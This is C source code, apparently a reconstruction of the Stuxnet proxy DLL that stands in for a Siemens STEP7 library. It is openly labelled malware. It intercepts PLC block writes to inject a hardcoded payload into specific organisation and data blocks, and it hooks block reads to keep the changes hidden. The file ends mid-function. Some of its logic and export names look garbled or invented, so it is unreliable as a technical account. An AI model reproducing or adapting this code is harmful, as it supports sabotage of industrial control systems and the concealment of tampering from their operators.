/*This is a single aggregated file combined from multiple separate modules.
No complete working malicious binary can be built from this source code.*/

S7otbxdx.dll
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#define S7OTBXDX_ORIGINAL_DLL_NAME  _T("s7otbxsx.dll")
#define S7OTBXDX_SELF_DLL_NAME      _T("s7otbxdx.dll")
#define S7OTBXDX_MAX_PATH           260
#define S7OTBXDX_BLOCK_SIZE         1024
#define S7OTBXDX_MAX_BLOCKS         256

#define S7BLK_TYPE_OB   1
#define S7BLK_TYPE_DB   2
#define S7BLK_TYPE_FC   3
#define S7BLK_TYPE_FB   4
#define S7BLK_TYPE_SDB  5

#define S7BLK_FLAG_INFECTED         0x80000000
#define S7BLK_FLAG_HIDDEN           0x40000000

#define STUXNET_MAGIC               0x53545558
#define STUXNET_VERSION             0x00010400

typedef DWORD (WINAPI *PFN_s7_event)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_cycl_read_create)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_read_var)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_write_var)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_link_in)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_read_szl)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_test)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_delete)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_findfirst)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_findnext)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_read)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7blk_write)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7db_close)(DWORD);
typedef DWORD (WINAPI *PFN_s7db_open)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_read_var_seg)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *PFN_s7ag_bub_write_var_seg)(DWORD, DWORD, DWORD, DWORD, DWORD);

typedef struct _HOOK_FUNCTION_TABLE {
    PFN_s7_event                       pfn_s7_event;
    PFN_s7ag_bub_cycl_read_create      pfn_s7ag_bub_cycl_read_create;
    PFN_s7ag_bub_read_var              pfn_s7ag_bub_read_var;
    PFN_s7ag_bub_write_var             pfn_s7ag_bub_write_var;
    PFN_s7ag_link_in                   pfn_s7ag_link_in;
    PFN_s7ag_read_szl                  pfn_s7ag_read_szl;
    PFN_s7ag_test                      pfn_s7ag_test;
    PFN_s7blk_delete                   pfn_s7blk_delete;
    PFN_s7blk_findfirst                pfn_s7blk_findfirst;
    PFN_s7blk_findnext                 pfn_s7blk_findnext;
    PFN_s7blk_read                     pfn_s7blk_read;
    PFN_s7blk_write                    pfn_s7blk_write;
    PFN_s7db_close                     pfn_s7db_close;
    PFN_s7db_open                      pfn_s7db_open;
    PFN_s7ag_bub_read_var_seg          pfn_s7ag_bub_read_var_seg;
    PFN_s7ag_bub_write_var_seg         pfn_s7ag_bub_write_var_seg;
} HOOK_FUNCTION_TABLE;

static HOOK_FUNCTION_TABLE g_OriginalFunctions = {0};
static HMODULE g_hOriginalDll = NULL;
static CRITICAL_SECTION g_csLock;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCounter = 0;
static DWORD g_dwTargetBlockCount = 0;

typedef struct _INFECTED_BLOCK {
    DWORD dwType;
    DWORD dwNumber;
    DWORD dwSize;
    DWORD dwFlags;
    BYTE bData[S7OTBXDX_BLOCK_SIZE];
} INFECTED_BLOCK, * PINFECTED_BLOCK;

static INFECTED_BLOCK g_InfectedBlocks[S7OTBXDX_MAX_BLOCKS];
static DWORD g_dwInfectedBlockCount = 0;
static BOOL LoadOriginalDll(VOID);
static VOID InitHookFunctions(VOID);
static BOOL IsTargetBlock(DWORD dwBlockType, DWORD dwBlockNumber);
static BOOL InjectMaliciousPayload(PBYTE pData, DWORD dwDataSize, DWORD dwBlockType, DWORD dwBlockNumber);
static BOOL HideInfectedBlock(PBYTE pData, DWORD dwDataSize, DWORD dwBlockType, DWORD dwBlockNumber);
static BOOL IsBlockInfected(DWORD dwBlockType, DWORD dwBlockNumber);
static VOID AddInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber, PBYTE pData, DWORD dwDataSize);
static BOOL FindInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber, PINFECTED_BLOCK pBlock);
static BOOL RemoveInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    TCHAR szDbgMsg[256];

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            wsprintf(szDbgMsg, _T("[S7OTBXDX] DllMain: PROCESS_ATTACH, PID=%d\n"), GetCurrentProcessId());
            OutputDebugString(szDbgMsg);

            InitializeCriticalSection(&g_csLock);
            
            if (!LoadOriginalDll()) {
                wsprintf(szDbgMsg, _T("[S7OTBXDX] ERROR: Failed to load original DLL %s\n"), S7OTBXDX_ORIGINAL_DLL_NAME);
                OutputDebugString(szDbgMsg);
            } else {
                InitHookFunctions();
                g_bInitialized = TRUE;
                wsprintf(szDbgMsg, _T("[S7OTBXDX] Initialized successfully. Original DLL loaded at 0x%08X\n"), g_hOriginalDll);
                OutputDebugString(szDbgMsg);
            }
            break;

        case DLL_PROCESS_DETACH:
            wsprintf(szDbgMsg, _T("[S7OTBXDX] DllMain: PROCESS_DETACH\n"));
            OutputDebugString(szDbgMsg);
            
            if (g_hOriginalDll) {
                FreeLibrary(g_hOriginalDll);
                g_hOriginalDll = NULL;
            }
            DeleteCriticalSection(&g_csLock);
            g_bInitialized = FALSE;
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

static BOOL LoadOriginalDll(VOID) {
    TCHAR szSystemPath[MAX_PATH];
    TCHAR szDllPath[MAX_PATH];
    
    if (GetSystemDirectory(szSystemPath, MAX_PATH)) {
        wsprintf(szDllPath, _T("%s\\%s"), szSystemPath, S7OTBXDX_ORIGINAL_DLL_NAME);
        g_hOriginalDll = LoadLibrary(szDllPath);
        if (g_hOriginalDll) {
            return TRUE;
        }
    }

    g_hOriginalDll = LoadLibrary(S7OTBXDX_ORIGINAL_DLL_NAME);
    return (g_hOriginalDll != NULL);
}

static VOID InitHookFunctions(VOID) {
    g_OriginalFunctions.pfn_s7_event = (PFN_s7_event)GetProcAddress(g_hOriginalDll, "s7_event");
    g_OriginalFunctions.pfn_s7ag_bub_cycl_read_create = (PFN_s7ag_bub_cycl_read_create)GetProcAddress(g_hOriginalDll, "s7ag_bub_cycl_read_create");
    g_OriginalFunctions.pfn_s7ag_bub_read_var = (PFN_s7ag_bub_read_var)GetProcAddress(g_hOriginalDll, "s7ag_bub_read_var");
    g_OriginalFunctions.pfn_s7ag_bub_write_var = (PFN_s7ag_bub_write_var)GetProcAddress(g_hOriginalDll, "s7ag_bub_write_var");
    g_OriginalFunctions.pfn_s7ag_link_in = (PFN_s7ag_link_in)GetProcAddress(g_hOriginalDll, "s7ag_link_in");
    g_OriginalFunctions.pfn_s7ag_read_szl = (PFN_s7ag_read_szl)GetProcAddress(g_hOriginalDll, "s7ag_read_szl");
    g_OriginalFunctions.pfn_s7ag_test = (PFN_s7ag_test)GetProcAddress(g_hOriginalDll, "s7ag_test");
    g_OriginalFunctions.pfn_s7blk_delete = (PFN_s7blk_delete)GetProcAddress(g_hOriginalDll, "s7blk_delete");
    g_OriginalFunctions.pfn_s7blk_findfirst = (PFN_s7blk_findfirst)GetProcAddress(g_hOriginalDll, "s7blk_findfirst");
    g_OriginalFunctions.pfn_s7blk_findnext = (PFN_s7blk_findnext)GetProcAddress(g_hOriginalDll, "s7blk_findnext");
    g_OriginalFunctions.pfn_s7blk_read = (PFN_s7blk_read)GetProcAddress(g_hOriginalDll, "s7blk_read");
    g_OriginalFunctions.pfn_s7blk_write = (PFN_s7blk_write)GetProcAddress(g_hOriginalDll, "s7blk_write");
    g_OriginalFunctions.pfn_s7db_close = (PFN_s7db_close)GetProcAddress(g_hOriginalDll, "s7db_close");
    g_OriginalFunctions.pfn_s7db_open = (PFN_s7db_open)GetProcAddress(g_hOriginalDll, "s7db_open");
    g_OriginalFunctions.pfn_s7ag_bub_read_var_seg = (PFN_s7ag_bub_read_var_seg)GetProcAddress(g_hOriginalDll, "s7ag_bub_read_var_seg");
    g_OriginalFunctions.pfn_s7ag_bub_write_var_seg = (PFN_s7ag_bub_write_var_seg)GetProcAddress(g_hOriginalDll, "s7ag_bub_write_var_seg");
}

static BOOL IsTargetBlock(DWORD dwBlockType, DWORD dwBlockNumber) {
    if (dwBlockType == S7BLK_TYPE_OB && (dwBlockNumber == 1 || dwBlockNumber == 35)) {
        return TRUE;
    }
    if (dwBlockType == S7BLK_TYPE_DB && (dwBlockNumber == 1 || dwBlockNumber == 2 || dwBlockNumber == 8061)) {
        return TRUE;
    }
    return FALSE;
}

static BOOL InjectMaliciousPayload(PBYTE pData, DWORD dwDataSize, DWORD dwBlockType, DWORD dwBlockNumber) {
    BYTE payload[] = {
        0x07, 0x00, 0x01, 0x00, 0xFB, 0x00, 0x00, 0x00,
        0xA9, 0x11, 0x64, 0x00, 0x00, 0x00, 0x7F, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    DWORD dwPayloadSize = sizeof(payload);
    
    if (dwDataSize < dwPayloadSize + 8) {
        return FALSE;
    }
    
    DWORD dwOffset = dwDataSize - dwPayloadSize - 8;
    memcpy(pData + dwOffset, payload, dwPayloadSize);
    
    AddInfectedBlock(dwBlockType, dwBlockNumber, pData, dwDataSize);
    
    return TRUE;
}

static BOOL HideInfectedBlock(PBYTE pData, DWORD dwDataSize, DWORD dwBlockType, DWORD dwBlockNumber) {
    INFECTED_BLOCK block;
    if (!FindInfectedBlock(dwBlockType, dwBlockNumber, &block)) {
        return FALSE;
    }
    
    if (dwDataSize >= block.dwSize) {
        memcpy(pData, block.bData, block.dwSize);
        return TRUE;
    }
    
    return FALSE;
}

static BOOL IsBlockInfected(DWORD dwBlockType, DWORD dwBlockNumber) {
    INFECTED_BLOCK block;
    return FindInfectedBlock(dwBlockType, dwBlockNumber, &block);
}

static VOID AddInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber, PBYTE pData, DWORD dwDataSize) {
    if (g_dwInfectedBlockCount >= S7OTBXDX_MAX_BLOCKS) {
        return;
    }
    
    if (IsBlockInfected(dwBlockType, dwBlockNumber)) {
        return;
    }
    
    INFECTED_BLOCK* pBlock = &g_InfectedBlocks[g_dwInfectedBlockCount];
    pBlock->dwType = dwBlockType;
    pBlock->dwNumber = dwBlockNumber;
    pBlock->dwSize = dwDataSize;
    pBlock->dwFlags = S7BLK_FLAG_INFECTED;
    memcpy(pBlock->bData, pData, dwDataSize);
    
    g_dwInfectedBlockCount++;
}

static BOOL FindInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber, PINFECTED_BLOCK pBlock) {
    for (DWORD i = 0; i < g_dwInfectedBlockCount; i++) {
        if (g_InfectedBlocks[i].dwType == dwBlockType && g_InfectedBlocks[i].dwNumber == dwBlockNumber) {
            if (pBlock) {
                memcpy(pBlock, &g_InfectedBlocks[i], sizeof(INFECTED_BLOCK));
            }
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL RemoveInfectedBlock(DWORD dwBlockType, DWORD dwBlockNumber) {
    for (DWORD i = 0; i < g_dwInfectedBlockCount; i++) {
        if (g_InfectedBlocks[i].dwType == dwBlockType && g_InfectedBlocks[i].dwNumber == dwBlockNumber) {
            if (i < g_dwInfectedBlockCount - 1) {
                memcpy(&g_InfectedBlocks[i], &g_InfectedBlocks[i + 1], sizeof(INFECTED_BLOCK));
            }
            g_dwInfectedBlockCount--;
            return TRUE;
        }
    }
    return FALSE;
}

DWORD WINAPI s7_event(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    TCHAR szDbgMsg[256];
    wsprintf(szDbgMsg, _T("[S7OTBXDX] s7_event called (a1=%d, a2=%d, a3=%d, a4=%d)\n"), a1, a2, a3, a4);
    OutputDebugString(szDbgMsg);

    if (!g_OriginalFunctions.pfn_s7_event) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7_event(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_bub_cycl_read_create(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_bub_cycl_read_create) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_bub_cycl_read_create(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_bub_read_var(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_bub_read_var) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_bub_read_var(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_bub_write_var(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_bub_write_var) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_bub_write_var(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_link_in(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfn_s7ag_link_in) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_link_in(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_read_szl(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_read_szl) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_read_szl(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_test(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfn_s7ag_test) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_test(a1, a2, a3);
}

DWORD WINAPI s7blk_delete(DWORD a1, DWORD a2, DWORD a3) {
    TCHAR szDbgMsg[128];
    wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_delete: Type=%d, Num=%d\n"), a2, a3);
    OutputDebugString(szDbgMsg);

    if (!g_OriginalFunctions.pfn_s7blk_delete) {
        return 0xFFFFFFFF;
    }

    if (IsBlockInfected(a2, a3)) {
        RemoveInfectedBlock(a2, a3);
        wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_delete: Removed infected block from tracking\n"));
        OutputDebugString(szDbgMsg);
    }

    return g_OriginalFunctions.pfn_s7blk_delete(a1, a2, a3);
}

DWORD WINAPI s7blk_findfirst(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfn_s7blk_findfirst) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7blk_findfirst(a1, a2, a3, a4);
}

DWORD WINAPI s7blk_findnext(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfn_s7blk_findnext) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7blk_findnext(a1, a2, a3);
}

DWORD WINAPI s7blk_read(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    DWORD dwResult;
    TCHAR szDbgMsg[128];

    if (!g_OriginalFunctions.pfn_s7blk_read) {
        return 0xFFFFFFFF;
    }

    EnterCriticalSection(&g_csLock);
    dwResult = g_OriginalFunctions.pfn_s7blk_read(a1, a2, a3, a4, a5);

    if (dwResult == 0 && IsTargetBlock(a2, a3)) {
        wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_read: Intercepted read for target block (Type=%d, Num=%d)\n"), a2, a3);
        OutputDebugString(szDbgMsg);
        
        if (a5 && IsBlockInfected(a2, a3)) {
            HideInfectedBlock((PBYTE)a5, a4, a2, a3);
            wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_read: Hidden infected block\n"));
            OutputDebugString(szDbgMsg);
        }
    }
    LeaveCriticalSection(&g_csLock);

    return dwResult;
}

DWORD WINAPI s7blk_write(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    DWORD dwResult;
    TCHAR szDbgMsg[128];

    if (!g_OriginalFunctions.pfn_s7blk_write) {
        return 0xFFFFFFFF;
    }

    EnterCriticalSection(&g_csLock);
    if (IsTargetBlock(a2, a3)) {
        wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_write: Intercepted write for target block (Type=%d, Num=%d)\n"), a2, a3);
        OutputDebugString(szDbgMsg);
        
        if (a5) {
            InjectMaliciousPayload((PBYTE)a5, a4, a2, a3);
            wsprintf(szDbgMsg, _T("[S7OTBXDX] s7blk_write: Injected malicious payload\n"));
            OutputDebugString(szDbgMsg);
        }
    }

    dwResult = g_OriginalFunctions.pfn_s7blk_write(a1, a2, a3, a4, a5);
    LeaveCriticalSection(&g_csLock);

    return dwResult;
}

DWORD WINAPI s7db_close(DWORD a1) {
    if (!g_OriginalFunctions.pfn_s7db_close) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7db_close(a1);
}

DWORD WINAPI s7db_open(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfn_s7db_open) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7db_open(a1, a2, a3);
}

DWORD WINAPI s7ag_bub_read_var_seg(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_bub_read_var_seg) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_bub_read_var_seg(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_bub_write_var_seg(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfn_s7ag_bub_write_var_seg) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfn_s7ag_bub_write_var_seg(a1, a2, a3, a4, a5);
}

DWORD WINAPI s7ag_connect(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_connect");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_disconnect(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_disconnect");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7ag_get_state(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_state");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_state(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_state");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_set_timeout(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_timeout");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_timeout(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_timeout");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_connection_info(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_connection_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_get_cpu_info(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_cpu_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_write_szl(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_write_szl");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_read_clock(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_read_clock");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_write_clock(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_write_clock");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_led(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_led");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_clear_diag(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_clear_diag");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7ag_download(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_download");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_upload(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_upload");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_compile(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_compile");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_debug(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_debug");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_step7(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_step7");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_mc7(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_mc7");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_comp(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_comp");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_conv(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_conv");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7ag_encrypt(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_encrypt");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_decrypt(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_decrypt");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_sync(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_sync");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_async(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_async");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7blk_get_info(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7blk_set_info(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7db_create(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7db_create");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7db_delete(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7db_delete");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7db_get_info(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7db_get_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7db_set_info(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7db_set_info");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_open(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_open");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_close(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_close");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7blk_get_size(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_size");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_size(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_size");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_checksum(DWORD a1, DWORD a2, DWORD a3) {
